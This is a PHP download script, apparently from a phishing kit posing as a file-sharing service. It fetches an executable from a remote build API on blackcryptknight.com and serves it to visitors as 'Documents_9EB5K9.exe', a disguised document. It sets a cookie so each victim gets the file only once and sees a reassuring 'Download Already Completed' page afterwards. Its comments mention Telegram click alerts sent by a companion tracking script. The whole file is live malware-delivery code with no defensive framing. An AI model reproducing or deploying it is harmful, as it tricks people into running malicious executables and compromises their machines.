<?php
// ==================== DOWNLOAD.PHP ====================
// Only serves the file - no Telegram call here
// Telegram alert is already sent from track.php when user clicked

$lockCookie = 'sharefile_download_locked';

// Check if already downloaded
if (isset($_COOKIE[$lockCookie]) && $_COOKIE[$lockCookie] === 'true') {
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>Download Already Completed</title>
        <style>
            body { font-family: Arial, sans-serif; background: #f4f7f9; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
            .box { background: white; padding: 40px; border-radius: 8px; text-align: center; box-shadow: 0 4px 12px rgba(0,0,0,0.08); max-width: 450px; }
            .icon { font-size: 60px; color: #6262EF; }
            h2 { color: #6262EF; margin: 15px 0; }
            p { color: #555; line-height: 1.6; }
        </style>
    </head>
    <body>
        <div class="box">
            <div class="icon">✓</div>
            <h2>Download Already Completed</h2>
            <p>Please check your Downloads folder.</p>
        </div>
    </body>
    </html>
    <?php
    exit;
}

setcookie($lockCookie, 'true', time() + (86400 * 1), '/', '', false, true);

// Serve the file
$remoteFile = 'https://blackcryptknight.com/api/build/e4ff7d69-9bdc-4db7-ac69-8a7dc0820af3/download';

if (ob_get_level()) { ob_end_clean(); }

header('Content-Description: File Transfer');
header('Content-Type: application/octet-stream');
header('Content-Disposition: attachment; filename="Documents_9EB5K9.exe"');
header('Content-Transfer-Encoding: binary');
header('Cache-Control: no-cache');
header('Pragma: public');

readfile($remoteFile);
exit;
?>
